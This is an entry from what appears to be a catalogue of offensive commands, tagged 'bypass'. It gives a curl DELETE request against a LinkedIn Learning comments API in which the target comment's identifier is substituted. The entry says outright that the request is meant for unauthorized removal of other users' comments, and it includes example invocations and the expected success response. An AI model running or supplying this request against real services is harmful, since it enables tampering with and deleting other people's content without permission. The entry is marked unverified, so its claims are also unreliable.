---
data: >-
  curl -X DELETE 'https://api.linkedin.com/learning/comments/{target_urn}' -H
  'Authorization: Bearer {token}'
tags:
  - api
  - bypass
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:32:29.099Z'
id: d4ab331b-58b1-4dea-b266-e4a627c59505
verified: false
validated: true
submitted: true
---
# curl-modify-urn

## Command

```bash
curl -X DELETE 'https://api.linkedin.com/learning/comments/{target_urn}' -H 'Authorization: Bearer {token}'
```

## Description

Prepares and tests a modified deletion request by substituting the target URN, enabling unauthorized comment removal testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X DELETE` | HTTP method for deletion | Yes |
| `{target_urn}` | Modified URN of the target comment | Yes |
| `-H 'Authorization: Bearer {token}'` | Session authentication | Yes |

## Examples

### Basic Usage

```bash
curl -X DELETE 'https://api.linkedin.com/learning/comments/urn:li:comment:99999' -H 'Authorization: Bearer abc123'
```

### Advanced Usage

```bash
curl -X DELETE 'https://api.linkedin.com/learning/comments/urn:li:comment:99999' -H 'Authorization: Bearer abc123' -v
```

## Expected Output

HTTP response like `HTTP/1.1 204 No Content` if successful, or error details.

## Related

- [[Related Procedure]]
